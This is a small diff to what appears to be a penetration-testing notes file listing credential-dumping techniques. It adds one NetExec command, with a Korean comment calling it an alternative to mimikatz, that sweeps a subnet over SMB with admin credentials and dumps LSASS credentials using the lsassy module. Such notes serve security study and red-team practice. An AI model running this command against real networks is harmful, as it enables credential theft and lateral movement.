@@ -130,6 +130,10 @@
 - powershell history
 - pypykatz/secretsdump
 - mimikatz
+```bash
+# mimikatz 대신에 사용 가능.
+nxc smb 192.168.150.0/24 -u 'Admin' -p 'Password' -M lsassy
+```
   
 </details>
 
